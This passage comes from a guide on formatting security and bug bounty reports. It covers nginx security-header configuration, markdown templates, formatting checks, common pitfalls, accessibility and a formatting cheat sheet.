    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';" always;
    
    location / {
        proxy_pass http://backend;
    }
}
```

### HTTP to HTTPS Redirect

```nginx
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

### HSTS Preload

Submit to HSTS preload list:
- URL: https://hstspreload.org
- Submit `example.com`
- Wait for inclusion (typically 1-3 months)

## Verification

```bash
# Check headers
curl -I "https://example.com/" | grep -E "(X-Content-Type-Options|X-Frame-Options|Strict-Transport-Security|Content-Security-Policy)"

# Expected output:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
# Content-Security-Policy: default-src 'self'; ...

# SecurityHeaders.com scan
# Expected: A+ rating
```
```

## Advanced Techniques

### Custom Markdown Extensions

Create custom markdown extensions for security reports:

```python
# Custom extension for vulnerability callouts
class VulnerabilityCallout Extension:
    def __init__(self):
        self.patterns = [
            (r'!!critical(.*?)!!', self.critical_callout),
            (r'!!warning(.*?)!!', self.warning_callout),
            (r'!!note(.*?)!!', self.note_callout),
        ]
    
    def critical_callout(self, match):
        return f'<div class="callout critical">{match.group(1)}</div>'
```

### Automated Report Generation

Automate report generation from scan results:

```python
import json
from jinja2 import Template

def generate_report(scan_results):
    template = Template(REPORT_TEMPLATE)
    return template.render(
        findings=scan_results['findings'],
        summary=scan_results['summary'],
        recommendations=scan_results['recommendations']
    )
```

### Template Systems

Create reusable templates for different report types:

```markdown
# {{ title }}

## Executive Summary

{{ executive_summary }}

## Findings

{% for finding in findings %}
### {{ finding.title }}

| Field | Value |
|-------|-------|
| Severity | {{ finding.severity }} |
| Endpoint | {{ finding.endpoint }} |
| Status | {{ finding.status }} |

{{ finding.description }}

{% endfor %}
```

### Version Control for Reports

Use git for report version control:

```bash
# Initialize report repository
git init report-repo
cd report-repo

# Create initial report
git add report.md
git commit -m "Initial report draft"

# Track changes
git diff report.md

# Compare versions
git diff HEAD~1 report.md
```

### Cross-Platform Rendering

Test reports across multiple platforms:

```bash
# Test on GitHub
grip report.md

# Test on GitLab
# Use GitLab markdown preview

# Test on Bitbucket
# Use Bitbucket markdown preview

# Test on custom platform
# Use platform-specific preview
```

## Detection Patterns

### Identifying Formatting Issues

Common formatting issues to detect:
1. Inconsistent header hierarchy
2. Missing alt text on images
3. Inconsistent code block formatting
4. Poor table alignment
5. Missing whitespace between sections
6. Inconsistent list formatting
7. Broken links
8. Missing footnotes
9. Inconsistent bold/italic usage
10. Poor image sizing

### Automated Formatting Checks

```bash
# Check header hierarchy
grep -n '^#' report.md | awk -F'#' '{print length($2), $0}'

# Check alt text
grep -n '!\[' report.md | grep -v 'alt='

# Check link validity
markdown-link-check report.md

# Check table formatting
grep -n '|' report.md | head -20

# Check code block syntax
grep -n '```' report.md
```

### Formatting Quality Metrics

Track formatting quality:
1. Readability score (Flesch-Kincaid)
2. Visual consistency score
3. Accessibility score
4. Platform compatibility score
5. Image quality score
6. Table formatting score

## Impact Assessment

### Formatting Impact on Readability

Measure the impact of formatting on readability:
1. Time to understand the vulnerability
2. Number of questions from triagers
3. Report acceptance rate
4. Bounty amount correlation
5. Client satisfaction scores

### Formatting Impact on Professionalism

Assess the impact of formatting on professionalism:
1. Visual appeal rating
2. Consistency rating
3. Platform compliance rating
4. Brand alignment rating
5. Accessibility compliance

## Common Pitfalls

### Pitfall 1: Inconsistent Header Hierarchy

**Problem**: Mixing H1, H2, and H3 headers inconsistently.
**Solution**: Establish header hierarchy standards and enforce them.

### Pitfall 2: Missing Image Alt Text

**Problem**: Images without alt text are inaccessible.
**Solution**: Add descriptive alt text to all images.

### Pitfall 3: Poor Table Formatting

**Problem**: Tables with inconsistent alignment and spacing.
**Solution**: Use markdown table generators and linting tools.

### Pitfall 4: Code Block Without Syntax Highlighting

**Problem**: Code blocks without language specification.
**Solution**: Always specify the language for syntax highlighting.

### Pitfall 5: Missing Whitespace

**Problem**: Dense text without breathing room.
**Solution**: Add proper spacing between sections and elements.

### Pitfall 6: Broken Links

**Problem**: Links that don't work or point to wrong locations.
**Solution**: Validate all links before submission.

### Pitfall 7: Poor Image Quality

**Problem**: Blurry, small, or poorly cropped images.
**Solution**: Use high-resolution screenshots with proper annotation.

### Pitfall 8: Inconsistent Formatting

**Problem**: Different formatting styles throughout the report.
**Solution**: Establish and enforce formatting standards.

### Pitfall 9: Over-Formatting

**Problem**: Too many formatting elements that distract from content.
**Solution**: Use formatting to enhance, not distract from, content.

### Pitfall 10: Platform-Specific Rendering Issues

**Problem**: Formatting that looks good in one renderer but not another.
**Solution**: Test on the target platform before submission.

## Integration with Other Skills

### Integration with Report Writing

Formatting supports report writing:
1. Visual hierarchy emphasizes key findings
2. Code blocks present technical content clearly
3. Tables organize comparison data
4. Images provide visual evidence
5. Whitespace improves readability

### Integration with Evidence Hygiene

Formatting supports evidence hygiene:
1. Proper screenshot annotation
2. Clear image captioning
3. Organized evidence presentation
4. Consistent evidence formatting

### Integration with Triage Validation

Formatting supports triage validation:
1. Clear severity presentation
2. Organized reproduction steps
3. Comprehensive evidence display
4. Professional presentation

### Integration with Bugcrowd and HackerOne

Platform-specific formatting:
1. Bugcrowd: VRT mapping, markdown formatting
2. HackerOne: Report structure, markdown formatting
3. Both: Clear, professional presentation

## Reporting Best Practices

### Formatting Checklist

**Pre-Submission Formatting Check**:
- [ ] Header hierarchy is consistent
- [ ] All images have alt text
- [ ] Tables are properly formatted
- [ ] Code blocks have syntax highlighting
- [ ] Whitespace is appropriate
- [ ] Links are valid
- [ ] Formatting is consistent
- [ ] Platform-specific requirements met

### Formatting Standards Documentation

Document formatting standards:
1. Header hierarchy rules
2. Code block formatting rules
3. Table formatting rules
4. Image formatting rules
5. Whitespace rules
6. Platform-specific rules

### Continuous Improvement

Continuously improve formatting:
1. Track formatting issues in reviews
2. Update standards based on feedback
3. Provide formatting training
4. Automate formatting checks
5. Share formatting best practices

## Labs and Practice Exercises

### Exercise 1: Markdown Mastery

Create a security report using advanced markdown features: tables, code blocks with syntax highlighting, nested lists, task lists, and footnotes.

### Exercise 2: Table Design

Design tables for different data types: vulnerability summary, comparison data, configuration settings, and severity matrices.

### Exercise 3: Diagram Creation

Create diagrams for attack chains, architecture, and data flows using Mermaid or PlantUML.

### Exercise 4: Image Annotation

Annotate screenshots with clear labels, highlights, and captions for a security report.

### Exercise 5: Platform Testing

Test a report on multiple platforms (GitHub, GitLab, Bugcrowd, HackerOne) and document rendering differences.

## Ethics and Responsible Disclosure

### Formatting Ethics

Maintain ethical standards in formatting:
1. Do not use formatting to mislead or exaggerate
2. Use formatting to enhance clarity, not obscure issues
3. Ensure accessibility for all users
4. Follow platform guidelines and standards
5. Protect sensitive information in images and code

### Accessibility

Ensure reports are accessible:
1. Add alt text to all images
2. Use proper heading hierarchy
3. Ensure sufficient color contrast
4. Provide text alternatives for diagrams
5. Use semantic markup

## Cheat Sheet

### Quick Reference for Formatting

1. **Headers**: Use H1 for title, H2 for sections, H3 for subsections
2. **Code Blocks**: Always specify language for syntax highlighting
3. **Tables**: Use markdown tables for structured data
4. **Images**: Add alt text and captions to all images
5. **Whitespace**: Add proper spacing between sections
6. **Bold**: Use for critical findings and key terms
7. **Italic**: Use for emphasis and file names
8. **Lists**: Use bullet lists for parallel items, numbered lists for sequences
9. **Blockquotes**: Use for callouts and important notes
10. **Links**: Validate all links before submission

### Formatting Command Reference

```bash
# Markdown linting
markdownlint report.md

# Link checking
markdown-link-check report.md

# Table formatting
cat table.csv | python format_table.py

# Image optimization
convert image.png -resize 800x600 image-optimized.png

# Code block formatting
pygmentize -g -o formatted.html source.py

# Report preview
grip report.md

# Word count
wc -w report.md

# Reading time
echo "$(($(wc -w < report.md) / 200)) minutes"
```

### Common Formatting Patterns

**Vulnerability Card**:
```markdown
| Field | Value |
|-------|-------|
| Severity | **Critical** |
| Endpoint | `/api/endpoint` |
| Parameter | `param` |
| Auth Required | Yes |
| Status | Open |
```

**Before/After Code**:
```markdown
**Before (Vulnerable)**:
\`\`\`python
[code]
\`\`\`

**After (Fixed)**:
\`\`\`python
[code]
\`\`\`
```

**Callout**:
```markdown
> **Warning**: This vulnerability is actively exploited.
```

**Evidence Caption**:
```markdown
![Description](image.png)
*Figure 1: Description of the image.*
```
